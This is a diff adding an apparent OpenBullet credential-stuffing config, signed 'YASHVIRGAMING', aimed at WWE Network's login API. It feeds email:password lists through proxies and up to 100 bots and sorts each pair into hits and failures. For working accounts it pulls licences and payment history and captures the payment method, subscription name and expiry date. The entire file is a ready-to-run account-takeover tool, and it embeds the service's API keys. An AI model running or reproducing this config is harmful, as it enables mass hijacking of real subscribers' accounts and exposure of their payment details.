@@ -1,0 +1,111 @@
+[SETTINGS]
+{
+  "Name": "WWE [UPDATED 2022]",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-07T19:07:03.6390598+04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://dce-frontoffice.imggaming.com/api/v2/login" 
+  CONTENT "{\"id\":\"<USER>\",\"secret\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "pragma: no-cache" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "origin: https://watch.wwe.com" 
+  HEADER "realm: dce.wwe" 
+  HEADER "referer: https://watch.wwe.com/signin" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "failedAuthentication" 
+  KEYCHAIN Success OR 
+    KEY "\"authorisationToken\":" 
+
+#TK PARSE "<SOURCE>" JSON "authorisationToken" -> VAR "TK" 
+
+REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/user/temporary/licences" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip;q=1.0, compress;q=0.5" 
+  HEADER "app: dice" 
+  HEADER "if-none-match: " 
+  HEADER "x-api-key: ef59c096-d95d-428e-ad94-86385070dde2" 
+  HEADER "realm: dce.wwe" 
+  HEADER "accept-language: en-US;q=1.0" 
+  HEADER "authorization: Bearer <TK>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "licences\":[]" 
+
+#STATUS PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "Status" 
+
+REQUEST POST "https://dce-frontoffice.imggaming.com/api/v2/customer/history/payment" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json" 
+  HEADER "content-type: application/json" 
+  HEADER "accept: */*" 
+  HEADER "authorization: Bearer <TK>" 
+  HEADER "accept-encoding: gzip;q=1.0, compress;q=0.5" 
+  HEADER "x-api-key: ef59c096-d95d-428e-ad94-86385070dde2" 
+  HEADER "app: dice" 
+  HEADER "accept-language: en-US;q=1.0" 
+  HEADER "content-length: 2" 
+  HEADER "user-agent: WWE Network/4.43.0 (com.wwe.universal; build:12204; iOS 13.3.1) Alamofire/4.9.1" 
+  HEADER "realm: dce.wwe" 
+
+#Payment_Method PARSE "<SOURCE>" JSON "paymentProviderType" CreateEmpty=FALSE -> CAP "Payment Method" 
+
+#Subscription PARSE "<SOURCE>" JSON "licenceName" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#ut PARSE "<SOURCE>" JSON "when" CreateEmpty=FALSE -> VAR "ut" 
+
+#Expiry FUNCTION UnixTimeToDate "yyyy-MM-dd" "<EXP>" -> CAP "Expiry" 
+
+#ct FUNCTION CurrentUnixTime -> VAR "ct" 
+
+#AUTHOR FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<ut>" GreaterThan "<ct>" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<ut>" EqualTo "<ct>" 
+    KEY "<ut>" LessThan "<ct>" 
+
